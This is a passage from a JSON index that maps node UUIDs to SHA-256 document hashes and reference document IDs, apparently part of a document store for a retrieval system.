"4ccabeb3-7d4a-4665-a063-e9381968fea8": {"doc_hash": "50ca8b845a5eb538e48c90058487c5eaa39bdc15b72e2c409068ed8ef508d342", "ref_doc_id": "e271e3aa-230e-43de-9f6d-d863a8312299"}, "85c84d10-d39b-47cc-bd80-20237f208430": {"doc_hash": "e64768c3948e4606d49300700fcdff7b04a0a05adfd7796f9643649e50b99fde", "ref_doc_id": "4bbe6897-99da-4eaa-bcf2-eaee9babb827"}, "68b5488b-4fed-4618-8b18-0cd708e9a44a": {"doc_hash": "563c78575a1c06fc99cd88fdbdc884066625099ed335be6b5d69fe383697ff9c", "ref_doc_id": "023d277a-eb7f-44aa-bc45-736b77eb9e8b"}, "da2109a6-d1a4-4347-a253-b3624cb1bc2f": {"doc_hash": "6fb4bafdcd93e576ffc3e65a12006f1af09e0b02b9322c92ab372fa27b4e952f", "ref_doc_id": "16823b45-b6ef-4128-9ffa-2304de5d83e5"}, "769f4554-3416-4f67-a669-c20f5fb54eb2": {"doc_hash": "ec8a883525d72a99c34fcb4b56232e600061f529c2af9af15a80cc34a083e2a3", "ref_doc_id": "16823b45-b6ef-4128-9ffa-2304de5d83e5"}, "3b4071f7-1281-4648-ad02-13f5deee3924": {"doc_hash": "7b7715667773558fcf5344041b18a81a72e3849e39ed70c3514cb33f20ed4bbe", "ref_doc_id": "4d0b0ad4-f993-4b18-bbce-7d5d804d13ab"}, "544bfb60-513e-46a9-84ac-6af751bd793a": {"doc_hash": "6766d43cdc0951ebc38bdcf055477e2f7f21601cea8b886bc08fed35d3c5ac64", "ref_doc_id": "5b2bfec0-7668-43f3-b767-df270b44b271"}, "4c71deb6-3602-45f9-8387-97ee376a8c9c": {"doc_hash": "7ee2b8d6ee45d3ff9bb7679a5c921c520723c195cbefeaef1bc080f08e8de0cc", "ref_doc_id": "c2a3a186-58d6-4cea-9c71-460ed5ce6531"}, "f89fbf74-9911-4f14-a8ee-965d2d7a1565": {"doc_hash": "595167033a49f39644696c9294b67c7ea0745ac605a8b394dae81da466fb9e55", "ref_doc_id": "b0f9bd5f-c05b-4d41-99b9-9d7acde949af"}, "2f4d7581-7733-4ee3-8d6f-42244a04365f": {"doc_hash": "25995a13e12a0e815a84aab610ee1c36ca45e74e881472d2b8fbf955d278d7e6", "ref_doc_id": "42410e12-a60a-4737-a944-b2aca4de4282"}, "981b5c60-d621-4485-8c44-50dee3eac023": {"doc_hash": "d501707dcebb0c1a6cf7e860b4d809ec9c803ef1d30c72b187957e5c39fcd5fd", "ref_doc_id": "42410e12-a60a-4737-a944-b2aca4de4282"}, "e97a3d2c-a96d-4d39-bd8e-d8503f877996": {"doc_hash": "2b8ffff167b96c35df54e1df93763dc9e6b3a7a22fe728505971e6de3cda91e5", "ref_doc_id": "920aa792-28cb-4fa9-b09e-72482eededd2"}, "2f7ac366-2c49-4c01-a0a4-746127f91343": {"doc_hash": "a3b96c282127d34f2bb2359011f89efd7f27f5d3441154f1cc22bc8a7f7ae313", "ref_doc_id": "dadfc12e-71af-4507-8697-d01e17d37f9e"}, "e102c32d-22b6-47b0-92c3-06dcd7e26666": {"doc_hash": "d38bc785d21299ba1bf9ce1af5e95ea2efbcbe670d463271725cc83cc2797dc8", "ref_doc_id": "96afaff2-0c9f-4592-ae22-cb2160815cbf"}, "9a0af945-0c3b-40f8-b9d7-4846e25c1986": {"doc_hash": "ed942171348586700154920a7d23ad4ed2a36dcf75d70e22974fc8203a6ca170", "ref_doc_id": "27eb8e21-c697-4749-8f32-5d43a2dbeb0d"}, "1f62e9b4-d9ac-4492-8aaf-219c53516252": {"doc_hash": "be5bd121589bec0248ed2c7fec1904fd28ed97c74dab36b267313a1c80b79673", "ref_doc_id": "4f454957-0da8-4138-bc5e-10cd78c3aa21"}, "adff1f21-3f0f-4b50-8346-9f29de097fed": {"doc_hash": "03de8560f6e6976dcca6962a2eb36e17cdebd765f239b1865e688688846570a0", "ref_doc_id": "4e6c12d6-02d1-462d-ad20-be31f3fdeb15"}, "1ca5b965-e735-4ba2-b0d9-c61ec0b724a9": {"doc_hash": "40e45b69f771bd6d24caf39232bddc26e1efc565632cb8b0328ae477111b552a", "ref_doc_id": "1fa24f1e-a3cc-4a19-b774-5389fd9ac055"}, "39dfe8f4-67ea-46b7-a46a-0e84af8ac29f": {"doc_hash": "e865f11d81b4c733ae2564df4f3d45796c835923ae61d8aad45694314624fb1e", "ref_doc_id": "1e533b1d-7938-4e8b-95d8-89738d2a994e"}, "fe8301b6-dd5d-4230-a275-3770863810e0": {"doc_hash": "39e3ddfaa4a8909c129d5a4db6d32c5a53e8dc874f009699f7488493a401dc4a", "ref_doc_id": "30980c54-9bb4-40fa-b53d-0f2f50ee0925"}, "45ac56f2-6645-49ff-aa03-54dec9754be6": {"doc_hash": "1d822c30e176a6d139ec449ae2fb5d0778cbb3baea08f596b14d940f9619f6ea", "ref_doc_id": "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79"}, "ea8230f8-6322-437c-92bc-5038e1f5cb25": {"doc_hash": "35a980a0f730fe1fe751aea1ac59acf2a45c8a2ec36333cfda12ef233091fce0", "ref_doc_id": "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79"}, "8920fceb-b70a-4fdd-87ca-3a2ddcee4333": {"doc_hash": "98f1b3b2a143f0a37550979ff6f7bc4394faf90a89925e6764d042d45b8f8811", "ref_doc_id": "6574cb40-9ac3-49ad-9751-81c00736ac61"}, "7af79901-0e8d-47da-95ba-214122fbc194": {"doc_hash": "bcf011a68102c412bdf81648013677902bbc8c2a6f70715357e784d0003e232b", "ref_doc_id": "b364a1bd-be12-4360-8a87-6afe2ec8003c"}, "339e5f4d-8538-4716-a1ac-87f50d0df7d3": {"doc_hash": "5e0ac65e332997256cd92acaf4a5e6e6739c5b6bc4d60b33cba8865c1b3cc9a4", "ref_doc_id": "b364a1bd-be12-4360-8a87-6afe2ec8003c"}, "bc97e67a-8605-4a3b-b618-00941455e9b7": {"doc_hash": "65b3a553f5485ca3e8d546a05cf0aa78a6eb2b99d3134dd1af26f0072120ec89", "ref_doc_id": "73438241-b85b-4f2a-81d4-ec965df349a4"}, "fd802492-a598-486c-96b2-c6f63a0e16df": {"doc_hash": "d50ad8081a18e3d67422443423a073a5218f440ff07e7e6e75544f217e14dbc8", "ref_doc_id": "c215f6d6-4245-463d-99d4-966189f3afcc"}, "17316681-6200-47a2-8ea8-9ea967eea101": {"doc_hash": "a67d30856cd587f1d62bfb544e7836113b9454bd493c192143e73f1ecebd4ea0", "ref_doc_id": "c215f6d6-4245-463d-99d4-966189f3afcc"}, "fecbb84f-a34a-40cd-825c-81f4998cbc4b": {"doc_hash": "b5a8a30ddb049b81f158d4673093363abbcb1fbdbbe85347d28bf8d5f844897d", "ref_doc_id": "c215f6d6-4245-463d-99d4-966189f3afcc"}, "8dbc1279-d151-4c8e-8419-93354d109408": {"doc_hash": "c06a88a3f90423ebf740d6f151dff4ee6470673de24fe2b8913b77534b230e43", "ref_doc_id": "dc8f8c68-ea3a-498f-8325-72d9b4aff3fe"}, "4ce776c3-3a3d-4611-b73f-6c1a00074b4a": {"doc_hash": "7ffeb739af4d2e4b3d79034d521ac2fa6c00bc11926d41f3c2dbd17524078d39", "ref_doc_id": "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc"}, "19f01f00-2344-40e1-ab2c-573af47d6e48": {"doc_hash": "ba05389d4e2bf732aa8402d147216a0ff8b4d58aaf833de2b590f449458b0811", "ref_doc_id": "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc"}, "8ec85144-1ce0-460d-9cc5-78e8433192af": {"doc_hash": "207eff11a9f7f6098cdca642526490fb0ca997978009f93305ebc3155a094701", "ref_doc_id": "f11cb73d-ec59-49e3-8391-7adc4aaccd2c"}, "14929813-ff0d-4d70-8bc6-d39b1380b98a": {"doc_hash": "4d23fcfeca3ea0d79575f9f0c71531bb65ba137c599318eb9b150ba879c3ee86", "ref_doc_id": "f11cb73d-ec59-49e3-8391-7adc4aaccd2c"}, "8e3fb50b-6f39-4382-941e-483470e0d4fd": {"doc_hash": "61c854d056a0bfb14d552641bd1e86dfa9fd2179b0163ca39d94b68f09b233b2", "ref_doc_id": "fdb1493f-c273-40b9-ba6e-a9adf26a6d24"}, "616c1a41-265c-4f55-917f-77ac86a8f2d5": {"doc_hash": "6d4068afb20d1255672e67baed43e5ace7af0d0a561ac817ef5ae2f3c8f513c9", "ref_doc_id": "a8345bde-297f-4740-81c4-df05ce25fe03"}, "edc858c7-4844-4e03-9da9-85f54c704919": {"doc_hash": "37c9c21bfa445094e66cdbc4504d5f590702a1f91b7581e8a5b3876fee0c7049", "ref_doc_id": "3b68f9e9-7843-456f-8a25-0233e692a9cc"}, "63c6b2c6-2da6-445a-b570-6982a64650a3": {"doc_hash": "6ca0c1f96eacc74d4fda073d6331d7cd0a63838ca71e36a5f1da4ba79463a0fa", "ref_doc_id": "963596af-a032-4fbd-8503-515ddb4fc969"}, "1cf868ad-75a8-4aa6-9d4f-0844628cb925": {"doc_hash": "37ecc9ea1822bfa51c1e56a45c752e85fb99a1bc7a1b8dd12f66fb09c1f5b0ad", "ref_doc_id": "c7dc7433-d0eb-48e8-acc7-fcec7e76c7b0"}, "4dc21662-3ae0-4006-9253-f0d7be64f107": {"doc_hash": "9b4da43edb9339f036be768bb92e9d938ecba7b3dbb1515559b8a48571fafaf1", "ref_doc_id": "18c3ac27-a884-455b-a17a-8d974f54dd18"}, "e9818ef0-f2f0-435e-8266-07b351a89d99": {"doc_hash": "6ea26ecbcf18ba3c3926f9e746dd534a94e82f4a7a6bc4dabae74d93642b5cba", "ref_doc_id": "6b7a3f2a-260e-494b-bba7-0b07c7921c4e"}, "35859147-247b-47b0-adda-797f40787f81": {"doc_hash": "7b0e8d120e4130cf4debc5f14c3273ec8bf794d78430408d1a45d4c4ef395e26", "ref_doc_id": "c302a78e-9a8e-4671-b8b4-6dd2d2ff21dc"}, "6df7e07d-0137-4cca-8d2f-6e55e91948d7": {"doc_hash": "71b418d6e761802614209e03e0caf753425970e6a9e80809f8edd03f9a01519c", "ref_doc_id": "c3d1ce14-6cb9-4818-89b6-904575e226cd"}, "e865073e-ef16-4d89-b490-f055dabb8681": {"doc_hash": "6889643a4630d510f958766bcc179fcc86ae2b13e0152350a7a3f8ad2030c0bf", "ref_doc_id": "0e41de41-abb0-4146-a3f7-3d568290221f"}, "14007516-4e91-4e5b-bfdc-b2b306f25ce7": {"doc_hash": "65344f413fa5aceca174d25d7475066993cb57803ca7ab2c86784266c291f671", "ref_doc_id": "1d5666f6-2915-4572-9244-6b6ecd146d15"}, "14d104f9-ea53-404a-b164-7c4b38083ddb": {"doc_hash": "6832e16e67db7efb9545b7d7f20412af84f141ae5c37cf83a33e4a74f2840398", "ref_doc_id": "2b655e01-c3c1-4012-bb8e-22360990e6b0"}, "c3f473a7-5d50-401d-984e-f43afd698468": {"doc_hash": "1a5a128113a279fe080b01964d865b110380c7f2a8a7832fe0630ae4dc119562", "ref_doc_id": "c85d4846-af91-4d6e-a70f-36e1502f6a33"}, "87a87626-408a-4e96-81af-42b5785479d4": {"doc_hash": "b83c78374baa78e090dae7bd5d4c6b8eb21b6c3090aa5ce52a0bdaac0e83841e", "ref_doc_id": "4487435c-303a-49c8-9439-b97285067e8e"}, "b5b0a15c-d961-4cd7-bd66-7d7640cd0865": {"doc_hash": "98e15279ddf701f9468ca80ea45a3d6fe1cd31797cea5e94e27141945bf7c224", "ref_doc_id": "895bab1a-3c52-4817-8561-0fcf869882aa"}, "ff6f390f-3943-40e0-bd72-6444d67f823a": {"doc_hash": "5354a71462246eb2f31e2595bc36be8e6920da5b58afb68bfcae0961d56bdef3", "ref_doc_id": "be9c74f3-8935-4ea4-95d2-828c0b360eb5"}, "7d85d6f5-8d03-412f-981a-1e628391d9f4": {"doc_hash": "d87f8052c6acb4b1a558a31cb4b8b0ddd7f1e25fdc25b83f830147b6a2cf94b4", "ref_doc_id": "be9c74f3-8935-4ea4-95d2-828c0b360eb5"}, "4371f9be-066c-42f1-b3e6-325e120ae83f": {"doc_hash": "b454c4ca1e517e3b2a35d03549be2be6a6d6b8c4b1169b3db1dca092963ed247", "ref_doc_id": "a51f5a34-816a-4051-8e10-150bd3f01e7b"}, "4c6a70de-e167-4836-a53e-02db41a8c6cb": {"doc_hash": "04037722bf424b771e1fb899129ee2b7c8d696e8c67e58b5963afd957fca8fd8", "ref_doc_id": "36a35c90-fdda-4d19-a246-184ea7945dad"}, "02641c1d-995b-47d5-85a5-fa20a394b757": {"doc_hash": "3040c9cff1e6f44e8cbf611a6c5acb39176920a90696d52902b78824021d116c", "ref_doc_id": "74d9bff8-98af-4bdf-bf8d-bba69cabd6b9"}, "151b8663-8455-4d26-8dc9-ae7df7104dbd": {"doc_hash": "2feccaa564ac57002be7e895746d8985f614479b8d04d58c8192c80fb1676d3f", "ref_doc_id": "96f4886e-da68-4538-8db9-165311fb9b71"}, "5b0409b7-79c2-4018-b318-1dd8088bc10c": {"doc_hash": "5867c219a8bb3181121bb859838004c0bc3d32021fadc1c12057f11486fc7444", "ref_doc_id": "96f4886e-da68-4538-8db9-165311fb9b71"}, "b81b570e-8eaa-46a1-b7a6-5208e01e8090": {"doc_hash": "4223069f975e9e7b2fa0e428757352c41a8bf29acca5041284a8c1f1dd4bea06", "ref_doc_id": "e85c1ce5-9e61-4cb2-ac5e-3341b93ce5cf"}, "8021fd5d-ec7b-49d5-bb63-b25a920dbcc0": {"doc_hash": "f00fb6347fbb0d123dfdcbeb1f53a451386738eca1300a021d7795e71fc25847", "ref_doc_id": "5a11ab77-d730-4737-97e4-0e94c752af01"}, "873897d9-6e8a-4a23-931b-4fc11092b26f": {"doc_hash": "63b63a0737f8ffb179c8d75a351d3d508129de071e275d03523e3267291019f1", "ref_doc_id": "440cf506-8894-451f-921e-ffd81cb06f82"}, "69511f88-80d1-487d-97d8-b1a206ff05d8": {"doc_hash": "bac5ec530ee6b9830951e323a3eb268583665b53c16942ae80fdeb2a136311ba", "ref_doc_id": "6766760c-589c-474f-8ada-3e1995bdfaa1"}, "d3c78e04-4164-4eef-9222-c93453c31c6f": {"doc_hash": "67a0fca5584f95d72771312c94ead77f26d0f91a185c8934df4eef6b45b4fe31", "ref_doc_id": "d2f83b4d-8c77-404f-bc10-3340ce7a5717"}, "2461d92c-7436-49b0-8947-b0bc0751ab94": {"doc_hash": "b5d277463f9c78ab375a47623ab8f2cc777449362c40f1ad5fec4dcf99a22062", "ref_doc_id": "a475e062-4680-4817-ada9-8b9172e5d14c"}, "44a75834-e9ba-44ca-aa2c-d767ef06d5ce": {"doc_hash": "e4ec38b05a600ed50fd6ff409b1cfb3d7ebfc7df01b71ef50c08bd90d6e09b26", "ref_doc_id": "e109ca46-30b3-4a43-99f7-6cdeebb7648f"}, "61303b7b-e3a6-49c1-a645-1fafe2c3f5de": {"doc_hash": "9f3167327f3b44b877b2c3c50f1c3a6d6a7cdbcdddbaf38ff98d746d9b235241", "ref_doc_id": "b9fa964e-8184-4a91-a33b-114343d438e0"}, "7046e90b-5885-47da-9090-6df80c0d95d1": {"doc_hash": "0fd9775126091b45d544a543e4adc3d070cde52321ff88879f069937e1d94b5e", "ref_doc_id": "b9fa964e-8184-4a91-a33b-114343d438e0"}, "60db438d-0758-4d43-9539-4437737af871": {"doc_hash": "7eff01af9e3810cc7d0e9ef376ad7d34840e513adf60a83088c95f6da6876347", "ref_doc_id": "b9fa964e-8184-4a91-a33b-114343d438e0"}, "8935791f-c72f-44d8-93cf-e573c7e740ab": {"doc_hash": "953025dd3487d01d60d2645108996aa0d1f45d7f66737c6d017d08b2250b1b43", "ref_doc_id": "b9fa964e-8184-4a91-a33b-114343d438e0"}, "0c1db893-9181-40aa-81ab-40f7cf6bd643": {"doc_hash": "5cbed0ebad1cd086d06a1f42ac3a6e85f0abeba33f394bd95e4b2a8939b46b44", "ref_doc_id": "b9fa964e-8184-4a91-a33b-114343d438e0"}, "4e78950d-2b59-47bf-bbbd-d627a775464e": {"doc_hash": "e551a444cc9c972a473eabaafd5267c5bd5fce5a0c3354f28eaa93970d0aecc8", "ref_doc_id": "1d46afa4-ccc6-421c-9628-d33ca49309fb"}, "42ea0ff1-9692-4f4a-a991-dcdd94b88766": {"doc_hash": "43729c0e02088dfafe853d97b9ae3a6c432293787d4ef2f5cfdf6b4702ed34c0", "ref_doc_id": "e862f6c7-60ae-41c4-9d8f-4b63f4ae461d"}, "0f5f2137-5ea2-42b4-babc-40e2281b9c62": {"doc_hash": "d630629a8b2edddc8d75be3c62155fdfb6b2ddbbd4eb2b1b5a6cd19d9b7c27c5", "ref_doc_id": "732f8371-e2f8-43f4-82e0-c5be41df060d"}, "d23e4ff0-621c-41bc-ac65-1f9c25100a62": {"doc_hash": "c48f299bb1d4ebcab4fdacb77fa7415cfbeb17a19c810584bb5f625408ae1851", "ref_doc_id": "00452626-e686-4fd0-aaef-6c94b4a53ecf"}, "dd1fd101-f34e-4652-9422-bc8af4d92161": {"doc_hash": "50bf7928f6275f137fba2904f3641501be4a5d1b3eaf82a144a1ea027cfef502", "ref_doc_id": "356064ba-2a01-45e1-abac-af478c5f5f54"}, "4761fa97-9da4-4739-950a-1344742d487d": {"doc_hash": "0597977723e1cb07d3368b64b90fe2422b29c63a16f89d53f62da8e8f083df40", "ref_doc_id": "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e"}, "d00909c2-1cc8-454c-87a5-8efa41bc4b2e": {"doc_hash": "c1d88df7aa7f203a6566ac3ba21c4592d6698c587a12bf18343164b596494b68", "ref_doc_id": "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e"}, "c6b5f50a-4abb-45c8-b3f1-87923571cc49": {"doc_hash": "7db84199990bb4cc4bc11241e603ec09babd1fcacbb811419363c02a6b94d08c", "ref_doc_id": "2e6ad1d1-039b-4708-8ac5-dd5ec5203b1b"}, "10d61ed7-2e95-4585-aeb9-02b5b1022b3b": {"doc_hash": "b543aa923cb33c67eb3e28f52db74d43a67b67341c19377d986d751ea30e9956", "ref_doc_id": "3fbc53f0-bb13-44e1-8062-aa37dba76f8f"}, "e2db8286-eb89-43c0-82ea-ce429e67f439": {"doc_hash": "4fb007b5ad0e811813fb8b60f547569fefb98088da018238269d194bfa89b902", "ref_doc_id": "61d5256c-c6b3-4fc1-bd32-8d00fd981a57"}, "82493a88-9907-46b4-be03-46732cc51be3": {"doc_hash": "274be28ea148a8bab03e06d095a750571a3775452baf428a02491080cf7f99a3", "ref_doc_id": "c3653e3e-2069-4f89-92dd-13429081a53e"}, "382edd58-e745-4a53-a869-d5bfe6f85576": {"doc_hash": "a9f15e54491110d54a39237b4e2e906a8d26eeeb3a45a0e0d18810ca3112f5ca", "ref_doc_id": "57c8e63b-7396-4653-9184-2dd505bd169b"}, "c28ef5eb-973b-498c-91c7-19ff6ebdad05": {"doc_hash": "4ad6497835619fc3a0cca260975ed7ff51efc4afa7eed49078d64a6f3e465c56", "ref_doc_id": "990921b8-9814-466f-8b99-54ea64cf0433"}, "a6a88632-d684-4123-9a08-daac48c9d3d2": {"doc_hash": "3357249f65ea1704dc19e8373b1b89d6e4ff95a2703edbe634bd9647e58ae255", "ref_doc_id": "3f327e6f-f253-4738-9c1a-4374d1f2b733"}, "aa99bc5c-bddd-4507-adf0-e40fb06b3e9e": {"doc_hash": "0ab9f7d4c1d54943e667521b95b2a8a5b1eab6ddd607669c0a80f26abe91613b", "ref_doc_id": "c3def46c-86ea-43b8-995c-e1ad40596e1f"}, "e06f32fa-c130-4197-91e7-086a8d7e31c7": {"doc_hash": "250d422db95eed8193736ac571993ad80bee9b9c449f582ee8c2365c97123660", "ref_doc_id": "13cc907c-74a3-4fc1-8a4c-24490254910d"}, "69608c5c-f945-465d-bfd5-eb32bde90c4c": {"doc_hash": "fde7bdce3946c513ecc794ccc0fe05293dfd1e04b6dafae63a6d69fbf5b5d22f", "ref_doc_id": "62371b0d-34fc-4266-9a71-71ba1dd09326"}, "4dff9c3c-60a5-4bbe-be59-301597f7f327": {"doc_hash": "292f054173979ae202df88f6b3c8751a0e63886cdd6163b24e81622334b3a73b", "ref_doc_id": "62371b0d-34fc-4266-9a71-71ba1dd09326"}, "04c70715-9371-4611-b3c8-2358b78b52aa": {"doc_hash": "5300650b91b74cc1d8afe249e641b2f1b143c10e03adb53c38c23481c00aba06", "ref_doc_id": "a859e5e9-8eaf-4a5c-b325-8e83563b3126"}, "8535adc3-044d-4220-89bd-6b718e0aa71c": {"doc_hash": "2591e6ca9bbee9fea5304ca2434f24f22442ef0a66ac89a4c1cd4e6d4a6cad6d", "ref_doc_id": "0612b6c0-3f76-4425-bbea-8928da2a906f"}, "29b04c9b-5e82-4da2-8ac7-6792948fc9b8": {"doc_hash": "1315cef8c844055ad059fc6dab6f798c9e979e93f2dadd84ee0b57bb2921e992", "ref_doc_id": "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64"}, "8bf15800-93b6-402d-8f7f-b20006704b7a": {"doc_hash": "caac491f7d3f40391163517e935caa3dedfc78d83eb83d4e1436ffa837e45e0d", "ref_doc_id": "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64"}, "b649884d-1020-4150-8fe0-60e6c2d161cb": {"doc_hash": "069f955434f33e2e3282c66ea6a841dd2ebcfdd7757e02afab68cade1446fa52", "ref_doc_id": "d198b9b6-6405-4299-8c9e-966e575abc01"}, "f342f81c-1808-4e96-b65b-c14bd672a0ac": {"doc_hash": "791d255351c0a348c5a50fda23bec7eab8294b54c5d474fa8198731caf7b3818", "ref_doc_id": "ccd9a8a0-1bd6-49b5-871e-9a31e61dabbf"}, "06d87ce0-76ee-48a8-a291-2a8e5ee44ff4": {"doc_hash": "59cf607c536cedfe28c02f28101b612ddb3f4e99294f5dbb8004ed23ef724311", "ref_doc_id": "d822a52e-52df-4b79-950a-27c3c5df989a"}, "c2ed619e-dd70-472a-b66f-7952ad164c59": {"doc_hash": "fae15b2639cee25e1768e3108941c3c3f74e41899f9cc3ae936440b4a078f204", "ref_doc_id": "63db19e4-93f8-4ac9-88a7-d160c4962737"}, "38695fc6-bc79-4993-beee-77e52f8890af": {"doc_hash": "4af174b4a196e9d3b4ef7d61a3db86a09b213caa1bc59e782ba6cae09e24356b", "ref_doc_id": "a83b156e-7852-47b7-8349-4f6acd5ebc78"}, "3c588ecf-ebe2-4559-8729-3c32abb989d8": {"doc_hash": "4e70c0b991764660211f18a8449580c5c642d35d7271555886e7a151121729ac", "ref_doc_id": "5bd326b8-12b7-4556-8a39-ac4dfac6afc5"}, "103db1be-a449-4684-83d0-f7c29edb0f88": {"doc_hash": "d8f1d9902b00fff97504812f6c3ade60868a5046212b5563b09e9e725ff7cf8a", "ref_doc_id": "93a3a32d-d3bc-4214-96f4-d68090eeae27"}, "d4a5bb6b-2990-4579-8f55-67df7bedd915": {"doc_hash": "40a3f80dcadc55cd268b4caa343569cecd3ce7bc62b7eb76352e4849b48cc275", "ref_doc_id": "93a3a32d-d3bc-4214-96f4-d68090eeae27"}, "0f0cd648-11be-415a-9948-d9f2507c9d5c": {"doc_hash": "334e1b265533cc010cad6d6885db895d2b2e0bf85a17f29785c7fa3c9da3a87c", "ref_doc_id": "625ed93f-3c5c-49fe-a7f9-12ba96660f06"}, "aa863a64-700c-4957-90f8-49447ec353bd": {"doc_hash": "14b82937522c203fbe92068273c2f7dc0907d58934ae91fba54b0bde14c6d915", "ref_doc_id": "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf"}, "2e2458ce-c4f2-4571-8703-27e2681e8f0e": {"doc_hash": "cddd2a5d2234d76d213f31e1e4fc6db0e03ff753a7b04fbb74c1d959ce263e68", "ref_doc_id": "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf"}, "ac9f3a6d-e2fa-45f5-8a2d-050b4dc83049": {"doc_hash": "808028f2291cc3ff30e563f5d91dddb11fd0d7c8945069eaab87fc46caa7d1ac", "ref_doc_id": "83672024-a890-4545-b120-740588085375"}, "092606bd-e087-4cf3-bae6-f65b678c60c3": {"doc_hash": "2f0709fdbf87e173e4f35c6961534b04e156aa02b43e496578389b76b3866f53", "ref_doc_id": "f61f67f4-6fa9-4633-a331-1ce0bbe3bb48"}, "40d0823c-600b-4683-bcf9-4d07aee0bf78": {"doc_hash": "cd1627ce8c5e08b4baeae914cb7935e08e87864d1fc985cd52c2945dd65aa08e", "ref_doc_id": "503f42e7-7cfa-4732-b3f4-2d8add9a3581"}, "d811b36f-f5ec-4e1c-89b8-46727e4f40e8": {"doc_hash": "b9c03d3afa43bff5717c6f558fce06b28e7d8320ab58ef1930ccdbfbf2c3fdf0", "ref_doc_id": "82fb0311-8900-45f3-858f-fb8fe32932d4"}, "fa4b85fe-c01a-41c0-97bb-3dc29a87f524": {"doc_hash": "5e2b6828227308f29ac2fb6d9f50aef053a989af3b071650e8c0cd7c248549d9", "ref_doc_id": "5a2c0663-b2bc-4f50-b017-0dbbc82478a1"}, "21c33561-85b3-4ef0-aca2-d690490d0004": {"doc_hash": "1c7c1e0eb54cc0c4e5aa248fa6c9c60b1ffd07b650f37f0a7aeaa0e2544e631b", "ref_doc_id": "a8aaacbb-9b9e-4d5b-9ecc-5e935a8a6cb5"}, "10d49434-a55b-4909-ad96-5604dc606a2f": {"doc_hash": "76cdbd1e1d2859ec9a1b93d881896a0a0604ae2f44768a3399968d0ebcc1b4f8", "ref_doc_id": "b5d66284-5809-4926-9c7d-c3f0f6275b03"}, "60335f50-e455-4181-94b6-881857817346": {"doc_hash": "6a3e2156e8f4e82e3fe9efbabc4ceda1797fe4ab161935195b21675e2f2e3db6", "ref_doc_id": "2e1f6904-858a-482a-921e-3251f8c3c0a2"}, "b780631a-a3e0-4618-b054-8ff7ef57def2": {"doc_hash": "f9e22318402fb14f923ddbd9f559856d2028d6687e6f273c57305454912ca697", "ref_doc_id": "5555f464-dbed-4a52-aa0a-79a3f4a3dee0"}, "ed5d4c2d-5e81-403f-91cc-dce49e7c993f": {"doc_hash": "9b30b76d6f75f066fff597f1dfaefaed25d3620841066edf59ea2239b73bfa80", "ref_doc_id": "973d3d5e-e131-4c51-b72e-614978dc958b"}, "e59ee73a-da68-46f9-817c-2365fb52b74c": {"doc_hash": "3549cc409b9e79928488da267c55c335658a262ff2f5d1521b0e90a972688037", "ref_doc_id": "ec5b012a-48ca-4a21-b22b-03483fd9d265"}, "a00ae6dc-b0d5-4071-a179-80216ca4dca9": {"doc_hash": "186027b4e690dd70f1c272630fb18c42785cd6d133d01aafbe3cc5f4054ac37d", "ref_doc_id": "fe136642-90cd-4683-b2ba-6bb03d9fe89c"}, "31d5b344-d5a6-4ee8-895a-371a351bcb39": {"doc_hash": "99d64eb57a3d5381f528930e88398e2bebb37b38adefc529b5f576fb924ecb6a", "ref_doc_id": "3004466a-db38-476d-9d5b-4ee726a038a5"}, "53f42d22-00a6-4c24-8deb-db4460aa98ba": {"doc_hash": "3b3b71bafd2a414ab3d35b044899393c90a3715e2c10ed25b9a00e0e66a320f4", "ref_doc_id": "bd400085-3ca5-4c45-9e82-bf7e70714bfb"}, "625573f9-780b-4e19-b060-9a222a7f8dc6": {"doc_hash": "86ebb61bc1829a3c02a5cb899f228f5a8788f2e0b910b252ff17e1b003dfca25", "ref_doc_id": "ff845f64-3bd1-459b-b866-fb62239cfe5e"}, "7f8f5531-db58-44fb-aba1-877928b301a8": {"doc_hash": "7e1e0bf0d1ddfca45e0723fce0057ec855dfbfcc0bac9375274ab244fe0d38b6", "ref_doc_id": "af877349-d564-49f8-9987-efabe2d3866b"}, "79ae6501-f4b5-4e60-8170-c092bcd02a66": {"doc_hash": "6873057a25cdba66df48f674c2d4d35f6e4e0b89e7d96d8a3f2cc79ee225c830", "ref_doc_id": "6756cc79-1442-4d55-a76c-b847f8620d42"}, "a51cfa4a-203a-49cc-8dbf-24f47af93d46": {"doc_hash": "d88b4ee447d7ae009a96932cc97ec375175b15606f8c7cbd98761d9308607e82", "ref_doc_id": "cc13b3fa-6fab-4857-b0f2-776ed395ab0e"}, "7c9dab0f-c58e-4f5c-8e42-4cf5ca0ba76a": {"doc_hash": "d80766ead3e8fd82a740276b2ce9cdac0dc34d99966c494930a8c241ace776c1", "ref_doc_id": "232ff45f-7478-40d2-8f8c-6d05c493b2d5"}, "fdfe6a42-f7f6-4433-b640-db6c8471ae3e": {"doc_hash": "3651fddefa8fe9f43395fa12b9147765b1ed218a0efeded3d03d0f0fa0647976", "ref_doc_id": "2e36d5de-57f3-4191-b2b0-f727da160a54"}, "0d10d235-5c10-4450-87e3-f73b235b6fb9": {"doc_hash": "be99c68af914947583c3822b2baa23f07b24a97064114e843549a591068a5ed3", "ref_doc_id": "e6bbdfaa-2896-47f9-9a8d-443630303409"}, "e57f8230-e77c-44bd-8a4a-ca52dfdd70f5": {"doc_hash": "1044e35b991f20b040386c407fc9ffc3029e09b6a6c8b1bb14a11f9ccec288e2", "ref_doc_id": "f57148e9-5935-4d0a-9aa3-7d80f7b2b56d"}, "cc9e2759-cf9b-412e-8192-55fcbd060453": {"doc_hash": "b5287a6002c7b1f11f1d0a908b5141a769e66a8ebb6a4d55d3cf1268863429ae", "ref_doc_id": "e5dc82c0-936a-459f-89be-eb1ea21641d2"}, "f9159372-9387-46e6-88ad-ee5443c13532": {"doc_hash": "b42eeaae5d28896c923bcd41646bcadb53d1d3b64ff4b03bf10ab9a6ed97d917", "ref_doc_id": "8042764e-2608-4e52-8407-57d9588f9755"}, "04ac218c-69ad-475a-8127-24f78c17171f": {"doc_hash": "89c768d344f9d2c391d2b09264cacb13892072bf24c92e37ee5771f355836531", "ref_doc_id": "88a19300-fbfa-47a5-be03-0185045e4027"}, 